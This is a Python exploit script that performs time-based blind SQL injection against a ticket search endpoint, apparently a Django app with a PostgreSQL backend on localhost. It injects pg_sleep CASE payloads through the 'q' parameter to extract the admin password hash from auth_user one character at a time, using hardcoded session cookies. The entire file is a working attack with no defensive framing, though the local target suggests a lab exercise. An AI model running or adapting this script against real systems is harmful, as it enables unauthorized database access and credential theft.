import requests
import time
import re

BASE_URL = "http://127.0.0.1:5001/tickets/search/"
COOKIES = {
    "csrftoken": "pEb1U5jbSFsAqSY3aU6YnQLH70zEczDY",
    "sessionid": "j1jdbs6kvjuz63k4tk083ceppwmv1a0c",
}# Need to replace with your own cookies from the browser after logging in to the application
HEADERS = {"User-Agent": "Mozilla/5.0"}

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$+/=_"
SLEEP_SECONDS = 3
THRESHOLD = SLEEP_SECONDS * 0.7  # anything above this counts as "true"

def is_true(payload):
    start = time.time()
    r = requests.get(BASE_URL, params={"q": payload}, cookies=COOKIES, headers=HEADERS)
    elapsed = time.time() - start
    if r.status_code != 200:
        raise RuntimeError(f"Unexpected status {r.status_code} - session cookie may have expired.")
    return elapsed > THRESHOLD

def recover_password_timed(username, max_len=100):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARSET:
            payload = (
                f"NoMatch' || (SELECT CASE WHEN "
                f"(SUBSTRING((SELECT password FROM auth_user WHERE username='{username}'),{pos},1)='{ch}') "
                f"THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END)::text-- "
            )
            if is_true(payload):
                result += ch
                found = True
                print(f"[{pos}] {result}")
                break
        if not found:
            print("No more characters found - end of string.")
            break
    return result

if __name__ == "__main__":
    hash_value = recover_password_timed("admin")
    print("\nRecovered password hash for admin (timing-based):")
    print(hash_value)